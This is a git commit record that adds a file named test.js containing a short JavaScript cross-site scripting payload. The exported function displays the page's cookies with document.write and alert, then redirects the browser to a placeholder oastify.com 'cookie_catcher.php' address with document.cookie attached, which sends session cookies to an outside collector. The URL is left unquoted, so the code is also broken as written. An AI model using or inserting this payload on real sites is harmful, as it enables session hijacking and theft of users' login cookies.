000a28c979003b24fdf661b64758ffb5e73eaab6
joshualingat <73262114+joshualingat@users.noreply.github.com>
2023-06-27 16:38:38 +0800

    Add files via upload

---
+++ test.js
@@ -0,0 +1,5 @@
+'use strict'
+
+module.exports = function() {document.write (document.cookie);
+alert (document.cookie);
+document.location= https://YOUR_URL_HERE.oastify.com/cookie_catcher.php?c= + document.cookie;}
